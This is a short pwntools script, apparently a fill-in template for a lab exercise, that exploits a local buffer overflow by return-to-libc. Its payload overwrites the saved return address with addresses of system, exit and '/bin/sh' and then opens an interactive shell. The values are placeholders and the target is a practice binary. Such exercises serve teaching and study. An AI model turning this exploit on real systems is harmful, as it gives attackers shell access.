#!/usr/bin/env python3
from pwn import *

context(os='linux', arch='i386')

p = process("/tmp/bof-ret2libc-basic/vuln")

offset = {buf_offset}      # offset to saved RET

libc_base = {libc_base}    # libc base address (ASLR OFF)
system = libc_base + {system_offset}
exit   = libc_base + {exit_offset}
binsh  = libc_base + {binsh_offset}

payload  = b"A" * offset
payload += p32(system)
payload += p32(exit)
payload += p32(binsh)

p.sendline(payload)
p.interactive()
